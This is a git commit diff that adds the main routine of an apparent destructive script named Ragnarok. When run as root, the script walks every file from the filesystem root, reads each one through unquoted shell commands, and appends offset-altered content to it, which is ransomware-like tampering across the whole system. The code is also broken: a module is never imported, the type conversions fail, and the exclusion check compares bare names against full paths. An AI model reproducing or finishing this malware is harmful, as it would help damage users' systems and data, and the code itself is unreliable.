ba54487a7fae4be78555900982c7b1ec85f35c82
Sam Burton <sam.burton271@gmail.com>
2024-09-18 10:24:09 -0400

    Added main function

--- Ragnarok/core.py
+++ Ragnarok/core.py
@@ -1,15 +1,29 @@
 import os
+import sys
 
 def main():
     fileList = findFiles()
+    offset = int(sys.argv[1])
+    for file in fileList:
+        command = "cat " + file
+        fileContent = subprocess.check_output(command, shell=True)
+        fileBin = fileContent.encode('utf-8')
+        fileHex = hex(fileBin)
+        fileInt = int(fileHex)
+        newInt = fileInt + offset
+        newHex = hex(newInt)
+        os.system('echo "' + newHex + '" >> ' + file)
     
 def findFiles():
+    self = str(sys.argv[0])
+    excludedFiles = [self, "/bin/cat", "/bin/echo"]
     fileList = []
     for root, dirs, files in os.walk("/"):
         for file in files:
-            path = os.path.join(root, file)
-            fileList.append(path)
+            if(file not in excludedFiles):
+                path = os.path.join(root, file)
+                fileList.append(path)
     return fileList
     
-if(os.getuid() == 0):
+if(os.getuid() == 0 and len(sys.argv) == 2):
     main()
